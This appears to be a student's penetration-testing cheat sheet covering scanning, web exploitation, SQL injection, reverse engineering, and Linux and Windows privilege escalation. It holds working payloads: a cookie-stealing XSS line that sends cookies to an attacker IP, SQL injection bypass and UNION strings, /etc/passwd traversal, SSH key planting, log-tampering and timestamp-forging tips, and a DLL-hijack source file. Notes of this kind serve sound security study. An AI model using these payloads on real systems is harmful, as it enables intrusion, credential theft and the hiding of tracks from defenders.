SCANNING AND RECON

    Python Scrapping - data collection https://towardsdatascience.com/how-to-use-python-and-xpath-to-scrape-websites-99eaed73f1dd
        sudo apt install python3-pip
        sudo pip3 install lxml
        sudo pip3 install requests

        ex.) scrape authors from
        <h2 class="text-white mb-4 name" data-aos="fade-right" data-aos-delay="200">Aaron Thomas</h2>
            
            authors = tree.xpath('//h2[@class="text-white mb-4 name"]/text()')

        from python terminal:
            import lxml.html #parse html
            import requests

            page = requests.get('http://quotes.toscrape.com')
            tree = lxml.html.fromstring(page.content)

            authors = tree.xpath('//small[@class="author"]/text()') #store all authors of page

    Scanning
        Host Enumeration:
            sudo nmap -sS -Pn 172.20.24.84 -p 21,22,80,443
        Host Interrogation
            nc -v <ip> <port> #banner grab
            nmap -sV <ip> <port>
            nikto -h <ip> -p <port> #open source vuln scan
            

            nmap -sC <host>     #scans host with all scripts (works over proxychains too)

    NMAP scripting engine (NSE) #/usr/share/nmap/scripts/
        nmap --script http-enum.nse <ip> #basic enumeration
        sudo nmap --traceroute --script traceroute-geolocation.nse -p 80 172.20.20.81 # traceroute, geolocation
        nmap -p 445 -Pn --script smb-os-discovery 172.20.25.215 #os discovery using 445(smb)

    Web Server Recon
        Nikto
            nikto -h <ip> -p 80     #lists lots of directories
        bannergrab w/ nc/nmap
        nmap nse scripts:
            http-enum   #search for directories
                nmap -Pn -T5 -sT -p 80 --script http-enum.nse <IP>
            http-sql-injection
                nmap -Pn -T5 -sT -p 80 --script http-sql-inection.nse <IP>
            http-robots.txt
                might miss stuff. check manually

WEB EXPLOITATION - look for robots.txt
    Apache serves HTML/CSS from /var/www/html # traditionally runs LAMP (apache, mysql, php) stack
        GET - information will be in the URL #http://website.com/form.php?field1=words
        POST - data is inside message body (bytes)
        DELETE

        Can run PHP - backend scripting language
        MySQL - relational backend database

    HTML
    JAVASCRIPT
        within <script> </script> tags
    CURL - 
        curl -o stuff.html http://website/stuff.html
        curl 'www..com' -H 'Cookie: name=123; settings=1,2,3,4,5,6,7' --data 'name=Stan' | base64 -d > item.png

    XSS
        Reflected XSS - links
            characters usually illegal in URLs can be base64 encoded
                http://example.com/page.php?name=dXNlcjEyMw%3D%3D
        Stored XSS - resides on site (iframe). only requires user to visit page
            Proof of concept to see is XSS works:
                <script>alert('XSS')</script>

    upload ssh key
        make .ssh file
        add public key to .ssh
            touch /var/www/.ssh/authorized_keys
            echo "the public key" > authorized_keys
        can authenticate using private key
        ssh -i <private> <host@ip> 
    Server-side injection (directory traversal) - ability to read/execute outside web servers dir
        uses ../../  paths
        ex.     ../../../../../../../etc/passwd
        

    Steal Cookies
        <script>document.location="http://<attacker ip>:<random port>/cgi-bin/grab.cgi?"+document.cookie;</script>  #quotes may need to be '

SQL 

    Table - entity
    Rows - instances
    Columns - properties

    Query
        SELECT <column property> FROM <table> #returns all columns of specified property

        WHERE clause #filter to just some rows of a column
            SELECT * FROM <table> WHERE id = 6; #select all columns from table where the id column = 6

            String Operators:
                = or !=             - case sensitive exact string compare
                LIKE or NOT LIKE    - case insensitive exact string compare
                    EX.     SELECT * FROM movies WHERE Title LIKE "%Toy%" ;

                %                   - use anywhere in string to match zero or more characters (only w/ LIKE or NOT LIKE
                    EX.     <column> LIKE "%AT%"        #matches "AT", "ATTIC", "CAT", "BATS"...

                _ (underscore)      - use anywhere in str to match single char (only w/ LIKE or NOT LIKE)
                    EX.     <column> LIKE "AN_"         #matches "AND" but not "AN"

                IN (...) NOT IN (...)- str exists in a list
                    EX.     <column> IN ("A", "B", "C")

        DISTINCT - show uniq columns
            SELECT DISTINCT <column>
            FROM <table>


        Ordering results (ORDER BY) - each row of results are sorted alpha-numerically
            SELECT <column>, ...
            FROM <table>
            WHERE <conditions>
            ORDER BY <column> <ASC/DESC>
        
        LIMIT/OFFSET (show a subset of results)
            SELECT <column>, ...
            FROM <table>
            WHERE <conditions>
            ORDER BY <column> <ASC/DESC>
            LIMIT 4 OFFSET 0 #show 4 starting from first (0th) element


        INNER JOIN - match rows from 1st tasble and 2nd table which have same key
            SELECT column, another_table_column, …
            FROM mytable
            INNER JOIN another_table 
                ON mytable.<column> = another_table.<column>
        
        LEFT/RIGHT/INNER JOIN VISUAL REPRESENTATION https://www.codeproject.com/Articles/33052/Visual-Representation-of-SQL-Joins


        NULL values
            WHERE <column> IS/IS NOT NULL
        
        Expressions
            SELECT col_expression AS expr_description, …    #AS is just a description
            FROM mytable;
        
        Aggregates
            SELECT role, AVG(years_employed) as Average_years_employed
            FROM employees
            GROUP BY role; #show avg years employed for each role of employee

        HAVING - written same as WHERE clause. used after GROUP BY to filter down
            SELECT group_by_column, AGG_FUNC(column_expression) AS aggregate_result_alias, …
            FROM mytable
            WHERE condition
            GROUP BY column
            HAVING group_condition;

SQL INJECTION
    information_schema database - names for columns, tables...
    Unsanitized - ' closes variable
    Username and Password ex
        User:       tom' OR 1='1
        Pass:       tom' OR 1='1
            server side looks like       SELECT id FROM users WHERE name='tom' OR 1='1' AND pass='tom' OR 1='1'

    Ignore rest - use # or --
        
    Selection=2 Union select table_schema,table_name,3 from information_schema.tables

    Database schemas

    after php:     
        1.) Selection=2 Union select 1, table_name, 3 from information_schema.tables    
            this lists all tables
        2.) Selection=2 Union select table_schema,table_name, null from information_schema.tables
                table_schema = the database name 
        3.) Selection=2 Union select table_name,null,column_name from information_schema.columns
                shows column properties of all tables
        4.) Seleciton=2 Union select name,cost,null from Tires
                pull back relevant info

        switch location of columns until it works
('First', 'Last', 'User', 'Pass', 'Email', 3) >
    
    through text box
        test if it works:
            Audi' or '1=1
        
        Audi' union select table_name,null,table_schema,4,5 from information_schema.tables #        remember to include the #
            uses Audi table which is prone to sql injection

        Audi' union select table_name,null,column_name,4,5 from information_schema.columns #
            show column properties
        Audi' union select type,null,carid,cost,year from car #
            pull back relevant info

        Audi' union select @@version,null,database(),null,null from session.Tires #
            session is the database name, Tires is the table

Reverse Engineering    
    Static Analysis
        CFF Explorer
            look at .dll s
            type of executable
    Behavioral Analysis
        Procmon, fakenet
    Disassembly
        Ghidra
            Under Symbol Tree
                Check for odd functions (main...)
                Check C converted (not always accurate)
                    Rename functions, variables to what they do
            Where to start
                check for strings
                in ghidra, search for the string to see where to start 
            Function Graphs
                follow 


POST EXPLOITATION
    Questions to ask:
        Who's logged in?
        Who am I?

        Networking
            IP, DNS, ARP Tables, Ports
            Hosts file (Static FQDN to IP, made by a human)
        
        Processes
            Tasks/CRON
            Services/Daemons
            User Run Processes
            
            Configurations (/etc)

        Logs
            Text 
                *.evtx (on disk) for windows
                /var/log/*.log for linux
                /etc/rsyslog.d/
            Binary
                journald for linux
                *.evtx (in memory) for windows

    Timestamps:
       M - modify (change data w/in file)
       A - reading (accessing) file contents
       C - change meta data


    Accessing Objects       Subject --> OS --> Object
                            UserID     Linux
                            SACL     Windows

find / -name "*.txt" 2> /dev/null | less



LINUX PRIVELEGE ESCALATION
    Sudo -l
        list of commands that can be used as root
        https://gtfobins.github.io/
    Determine current user level:
        id, whoami, (# $), echo $PS1, visudo

    SUID - set user ID bit
        rwsrwxrwx   - runs as owner of the file
        chmod 4777
    SGID - set group ID bit
        rwxrwsrwx   - runs as group that created file
        chmod 2777

    search for files with sgid/suid bit set
        find / -type f -perm /2000
        find / -type f -perm /4000
        find / -type f -perm /6000 #both
        
    Find Directories with world writable perms
        find / -type f -perm /2 -o -type d -perm /2 2>/dev/null
        find / -type f -writable -o -type d -writable 2>/dev/null #anything I can write to

    run file on each exe, check hash, check permissions
        some files will check the real user ID, even if file is run as root
        find binaries that arent

    Cron
        check if you can modify cron job scripts (is it in /temp?)
        /etc/crontab

        /etc/cron.d/     - run whenever its told to
        
        find /var/spool/cron/crontabs /etc/cron* -writable -ls  #find all crons that you can modify

    Kernel vulnerabilities 
        uname -a, google

    Boot Process Persistence
        /etc/rc5.d
    
    Find INIT type
        ls -latr /proc/1/exe
        stat /sbin/init
        man init
        init --version
        ps 1

    Audit SYSTEMV - uses journalctl
        ausearch    - pulls from audit.log

        Covering tracks logs 
            lastlog --- each users successful login time

            btmp --- tracks bad login attempts

            secure --- Syslog

            sulog --- use of su command

            utmp --- users currently on (w)

            wtmp --- permanent record on user on/off

            auth.log/secure --- tracks usage of authorization
    
    last - last users logged in

    touch -r file1.txt file2.txt   #change file1's timestamp to file2's

    Logging Remote (rsyslog port 514)
        take note of uncommented lines
        <facility>.<priority>



WINDOWS PRIVILEGE ESCALATION (changing AT or DACL)
    Windows Access Control:
        Subjects --> Permissions --> Objects
        
        Permissions #Subjects have ATs, Objects have DACLs
            Access Token - unique value attached to every user session (subject)
                defines Groups, User SID
            Discretionary Access Control List (DACL) - objects have these
                defines WHAT may access the object

            ACE (Access Control Entry) # AT and DACL define ACE
                combined AT and DACL

    Windows Boot Process
        Csrss.exe
            csrss.exe[0]    #owned by LocalSystem
                services.exe
                    svchost
                    svchost
            csrss.exe[1]    #user stuff (who your're logged in as)
                winlogon
                    logonui....
                        explorer



    localsystem - highest privilileged user account

    Localsystem --> Permissions --> Registry
    
        Registry - Run as whoever reads the data (registry is the object)
            Tasks and Services are stored in registry, read by LocalSystem (Subject)

            User (Subject) only has access to HKCU
                HKLM - Read only by users
                HKCU - Read, Write by users. derived from HKLM.

        Tasks- Run as LocalSystem (Subject)
            User's access:
                Read
                Write
        Services - Run as LocalSystem (Subject)
            User's Access
                Read

    
    Commands
        sc query   - display services, accesses the registry
            reg query HKLM\SYSTEM\CurrentControlSet\Services #LocalSystem executes the services found here
        icacls <directory>   # display ACE (Access Control Entry) get permissions for a directory
            R - read
            W - Write....
            CI - Container Inherit
            OI - Object Inherit
        Powershell scripts:
            Get all services where caption/pathname doesn't contain windows
                Get-WmiObject win32_service | where { $_.Caption -notmatch "Windows" -and $_.PathName -notmatch "Windows" }

    SVCHOST - load dll from path in registry key
        reg query HKLM\SYSTEM\CurrentControlSet\Services\XboxGibSvc
            DisplayName is the dll that is loaded
                
    Since Services are run as LocalSystem, if the service binary is modifiable by you (standard user), you can replace binary and get LocalSystem access

    Process Execution Steps
        putty.exe
            Into Memory
                Load DLLs from:
                    1.) Present Directory of EXE
                    2.) DLL Location Key
                    5.) Current Directory of the calling EXE

   to compile to dll: sudo apt install g++-mingw-w64-i686
   Example DLL: 
         * i686-w64-mingw32-g++ -c -D example.dll simple.c -o simple.o
         * i686-w64-mingw32-g++ -shared -o simple.dll simple.o  -Wl,--out-implib,simple.a
         */
        #include <windows.h>
        int execCommand()
        {
         WinExec("cmd /C whoami > C:/Users/DemoAdmin/Desktop/WhatsGood.txt", 1);
         WinExec("cmd /C whoami > FINDME_1.txt", 1);
         WinExec("whoami > FINDME_2.txt", 1);

         return 0;
        }
        BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
        {
         execCommand();
         return 0;
        }

    
    SCHTASKS - is able to run tasks as any user
        is the binary being scheduled in a non \Windows directory?
            can overwrite it with malicious binary?



        







            


